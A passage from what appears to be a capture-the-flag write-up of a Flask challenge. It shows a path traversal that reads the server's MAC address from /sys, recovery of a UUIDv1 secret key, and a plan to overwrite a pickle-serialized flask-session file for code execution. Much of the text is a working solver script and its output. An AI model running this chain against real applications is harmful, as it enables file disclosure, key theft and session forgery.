</span></span></code></pre></div><p>Still&hellip; How does that lead to an RCE? Do we need an RCE?</p>
<ol>
<li>No <code>TEMPLATES_AUTO_RELOAD</code>, we can&rsquo;t overwrite a template for easy RCE</li>
<li>Sessions are permanent though, and they reside on the filesystem.</li>
<li>We cannot upload a file with extension, we don&rsquo;t need to though, we will just overwrite a session with deserialization ;)</li>
<li>We find explanation for these constants here, notice that tokens are serialized using a weird function: <a href="https://flask-session.readthedocs.io/en/latest/config.html#SESSION_SERIALIZATION_FORMAT">https://flask-session.readthedocs.io/en/latest/config.html#SESSION_SERIALIZATION_FORMAT</a></li>
</ol>
<p>We will look at these later, lets review the <code>allowed_file</code> logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allowed_file</span>(filename):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">not</span> (<span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">in</span> filename <span style="color:#f92672">and</span> (filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower() <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> ALLOWED_EXTENSIONS <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">in</span> filename))
</span></span></code></pre></div><p>Translates to:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file_is_allowed <span style="color:#f92672">=</span> <span style="color:#f92672">not</span> (contains_dot <span style="color:#f92672">and</span> (extension_is_not_allowed <span style="color:#f92672">or</span> contains_two_dots))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># flip it</span>
</span></span><span style="display:flex;"><span>file_is_allowed <span style="color:#f92672">=</span> does_not_contain_dot <span style="color:#f92672">or</span> (extension_is_allowed <span style="color:#f92672">and</span> does_not_contain_two_dots)
</span></span></code></pre></div><p>There could be a differential between how the file is checked here, and the actual file saved:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ext <span style="color:#f92672">=</span> os.path.splitext<span style="color:#f92672">(</span>file.filename<span style="color:#f92672">)[</span>1<span style="color:#f92672">]</span>.lower<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>save_filename <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;{gen_filename(file.filename, user.username)}{ext}&#34;</span>
</span></span></code></pre></div><p>To generate a similar <code>uuidv1</code> secret, we need the server&rsquo;s MAC address, we need an arbitrary file read, looking around:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/profile_picture&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">profile_picture</span>():
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(username<span style="color:#f92672">=</span>username)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;User not found&#34;</span>, <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user<span style="color:#f92672">.</span>profile_photo <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>static_folder, <span style="color:#e6db74">&#39;default.png&#39;</span>))
</span></span><span style="display:flex;"><span>    file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>], user<span style="color:#f92672">.</span>username <span style="color:#f92672">+</span> user<span style="color:#f92672">.</span>profile_photo)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(file_path):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>static_folder, <span style="color:#e6db74">&#39;default.png&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(file_path)
</span></span></code></pre></div><p>Notice the file save logic, below which allows us to configure the path even if file save fails by incorrectly commiting the results in the <code>finally</code> clause:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(filepath):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		user<span style="color:#f92672">.</span>profile_photo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span>save_filename
</span></span><span style="display:flex;"><span>		file<span style="color:#f92672">.</span>save(filepath)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>		user<span style="color:#f92672">.</span>profile_photo <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>		flash(<span style="color:#e6db74">&#39;Failed to save file&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;profile_get&#39;</span>))
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>		db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>	flash(<span style="color:#e6db74">&#39;File already exists&#39;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;profile_get&#39;</span>))
</span></span></code></pre></div><p>We have full control over the username, as well as the profile photo name as long as it does not have an extension. We can easily upload any file by controlling the username, profile picture does not matter/should trigger an error. Eventually, we get it right and we exfiltrate the MAC address from <code>/sys/network</code></p>
<p>On <code>flask-session</code>&rsquo;s website, we find the following notice (Our app uses Flask-Session <code>0.8.0</code>):
<img src="timeless_flasksession.png"></p>
<p>Having the secret key, and file upload in hand, and knowing about the pickle deserialization vulnerability, we want to take this further. However, how do we identify the stored session identifier which stores our session?</p>
<p>In <code>flask-session</code> docs:</p>
<pre tabindex="0"><code>class flask_session.filesystem.FileSystemSessionInterface(app: Flask, key_prefix: str = &#39;session:&#39;, use_signer: bool = False, permanent: bool = True, sid_length: int = 32, serialization_format: str = &#39;msgpack&#39;, cache_dir: str = &#39;/home/docs/checkouts/readthedocs.org/user_builds/flask-session/checkouts/latest/docs/flask_session&#39;, threshold: int = 500, mode: int = 384)

Uses the cachelib.file.FileSystemCache as a session storage.

Parameters:
        key_prefix ‚Äì A prefix that is added to storage keys.
        use_signer ‚Äì Whether to sign the session id cookie or not.
        permanent ‚Äì Whether to use permanent session or not.
        sid_length ‚Äì The length of the generated session id in bytes.
        serialization_format ‚Äì The serialization format to use for the session data.
        cache_dir ‚Äì the directory where session files are stored.
        threshold ‚Äì the maximum number of items the session stores before it
        mode ‚Äì the file mode wanted for the session files, default 0600
</code></pre><p><code>flask-session</code>&rsquo;s filesystem storage uses <code>FileSystemCache</code> from <code>cachelib</code>.</p>
<ul>
<li>Flask Session&rsquo;s <code>FileSystemSessionInterface</code>: <a href="https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/filesystem/filesystem.py#L17">https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/filesystem/filesystem.py#L17</a></li>
<li>Cachelib&rsquo;s <code>FileSystemCache</code> (Indeed using pickle internally): <a href="https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/file.py#L218C5-L233C20">https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/file.py#L218C5-L233C20</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self, key: str) <span style="color:#f92672">-&gt;</span> _t<span style="color:#f92672">.</span>Any:
</span></span><span style="display:flex;"><span>	filename <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_filename(key)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">with</span> self<span style="color:#f92672">.</span>_safe_stream_open(filename, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>			pickle_time <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;I&#34;</span>, f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">4</span>))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> pickle_time <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> pickle_time <span style="color:#f92672">&gt;=</span> time():
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>serializer<span style="color:#f92672">.</span>load(f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">OSError</span>, <span style="color:#a6e22e">EOFError</span>, struct<span style="color:#f92672">.</span>error):
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>warning(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;Exception raised while handling cache file &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;&#34;</span>,
</span></span><span style="display:flex;"><span>			filename,
</span></span><span style="display:flex;"><span>			exc_info<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span></code></pre></div><p>Grabbing remote&rsquo;s secret key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged in
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Grabbing status
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Grabbing MAC address via path traversal in profile photo
</span></span><span style="display:flex;"><span>4e:0b:60:30:b2:e7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exfiltrated MAC address: 4e0b6030b2e7
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Computing server start, seed and UUIDv1 secret...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Secret found:
</span></span><span style="display:flex;"><span>        Server start time: 2025-01-12 17:28:16.846919+00:00
</span></span><span style="display:flex;"><span>        Server seed: <span style="color:#ae81ff">1736702896</span>
</span></span><span style="display:flex;"><span>        Server secret: 9bf972c0-d10a-11ef-ada0-4e0b6030b2e7
</span></span></code></pre></div><p>This is how sessions are saved in flask session by calling <code>_upsert_session</code>:</p>
<ul>
<li><a href="https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/filesystem/filesystem.py#L96">https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/filesystem/filesystem.py#L96</a></li>
</ul>
<p>Which in turn calls <code>cachelib</code>&rsquo;s <code>set</code>.</p>
<p>To get the filename from session ID, we do use the following where the session ID is the prefix before the <code>.</code> in the signed flask-session token:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>hashlib.md5<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;session:&#39;</span>+b<span style="color:#e6db74">&#39;q1ExS6FzHdu758o94mt8Bwwh-oYErnqMsjLydCzH9U0&#39;</span><span style="color:#f92672">)</span>.hexdigest<span style="color:#f92672">()</span>
</span></span></code></pre></div><p>After sometime spent on this challenge, I realized that the author, <em>intentionally</em>, swapped argument order between function definition and function call which left me wondering why is my md5 &ldquo;not working&rdquo;. Notice:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>save_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>gen_filename(file<span style="color:#f92672">.</span>filename, user<span style="color:#f92672">.</span>username)<span style="color:#e6db74">}{</span>ext<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>vs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_filename</span>(username, filename, timestamp<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> timestamp:
</span></span><span style="display:flex;"><span>        timestamp <span style="color:#f92672">=</span> int(datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>timestamp())
</span></span><span style="display:flex;"><span>    hash_value <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hash_value
</span></span></code></pre></div><p>I only noticed the discrepancy after plastering the source code with prints.</p>
<p>Anyways below is my complete solver.</p>
<p><strong>My Solver</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests <span style="color:#f92672">,</span> random<span style="color:#f92672">,</span> datetime<span style="color:#f92672">,</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests.exceptions <span style="color:#f92672">import</span> ChunkedEncodingError
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> myuuid <span style="color:#f92672">import</span> uuid1
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> multiprocessing.pool <span style="color:#f92672">import</span> ThreadPool
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itsdangerous <span style="color:#f92672">import</span> Signer, BadSignature
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode, urlsafe_b64encode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:3000&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_server_start_time</span>(status):
</span></span><span style="display:flex;"><span>    server_time <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>strptime(status[<span style="color:#e6db74">&#39;server_time&#39;</span>], <span style="color:#e6db74">&#34;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S.</span><span style="color:#e6db74">%f</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    server_time <span style="color:#f92672">=</span> server_time<span style="color:#f92672">.</span>replace(tzinfo<span style="color:#f92672">=</span>datetime<span style="color:#f92672">.</span>timezone<span style="color:#f92672">.</span>utc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    uptime_str <span style="color:#f92672">=</span> status[<span style="color:#e6db74">&#39;uptime&#39;</span>]
</span></span><span style="display:flex;"><span>    h, m, s <span style="color:#f92672">=</span> uptime_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> int(h)
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> int(m)
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> float(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    uptime_delta <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>timedelta(hours<span style="color:#f92672">=</span>h, minutes<span style="color:#f92672">=</span>m, seconds<span style="color:#f92672">=</span>s)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> server_time <span style="color:#f92672">-</span> uptime_delta
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/sys/class/net/eth0/address&#39;</span>
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>username, password<span style="color:#f92672">=</span>password))
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>username, password<span style="color:#f92672">=</span>password))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Write something&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Login failed.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Logged in&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Grabbing status&#39;</span>)
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/status&#39;</span>)<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Grabbing MAC address via path traversal in profile photo&#39;</span>)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile&#39;</span>, files<span style="color:#f92672">=</span>dict(profile_photo<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;address&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    received_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    file_contents <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile_picture&#39;</span>, params<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>username), stream<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># flask send_file from /sys filesystem behaves weirdly returning 4096 content-length regardless</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>iter_content(chunk_size<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk: <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            file_contents <span style="color:#f92672">+=</span> chunk
</span></span><span style="display:flex;"><span>            received_bytes <span style="color:#f92672">+=</span> len(chunk)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> ChunkedEncodingError:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>        print(file_contents<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> received_bytes <span style="color:#f92672">==</span> <span style="color:#ae81ff">18</span>, <span style="color:#e6db74">&#39;Invalid MAC address received.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    mac_address <span style="color:#f92672">=</span> int(file_contents<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Exfiltrated MAC address: </span><span style="color:#e6db74">{</span>mac_address<span style="color:#e6db74">:</span><span style="color:#e6db74">012x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Computing server start, seed and UUIDv1 secret...&#39;</span>)
</span></span><span style="display:flex;"><span>    server_stime <span style="color:#f92672">=</span> get_server_start_time(status)
</span></span><span style="display:flex;"><span>    server_ts <span style="color:#f92672">=</span> server_stime<span style="color:#f92672">.</span>timestamp()
</span></span><span style="display:flex;"><span>    server_seed <span style="color:#f92672">=</span> int(server_ts)
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(server_seed)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    rand_bits <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">14</span>)
</span></span><span style="display:flex;"><span>    server_secret <span style="color:#f92672">=</span> uuid1(ns<span style="color:#f92672">=</span>int(server_ts <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">9</span>), clock_seq<span style="color:#f92672">=</span>rand_bits, node<span style="color:#f92672">=</span>mac_address)
</span></span><span style="display:flex;"><span>    server_secret <span style="color:#f92672">=</span> str(server_secret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Secret found:&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Server uptime:&#34;</span>, status[<span style="color:#e6db74">&#39;uptime&#39;</span>])
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Server start time:&#34;</span>, server_stime)  
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Server seed:&#39;</span>, server_seed)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Calculated server secret:&#34;</span>, server_secret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    signed_sid <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;session&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Cracking server secret (4 bytes)...&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unsign</span>(missing):
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> server_secret[:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(missing) <span style="color:#f92672">+</span> server_secret[<span style="color:#ae81ff">8</span>:]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(key) <span style="color:#f92672">==</span> <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>        sid <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            signer <span style="color:#f92672">=</span> Signer(secret_key<span style="color:#f92672">=</span>key, salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flask-session&#34;</span>, key_derivation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hmac&#34;</span>)
</span></span><span style="display:flex;"><span>            sid <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>unsign(signed_sid)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> BadSignature <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> sid:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> key, sid
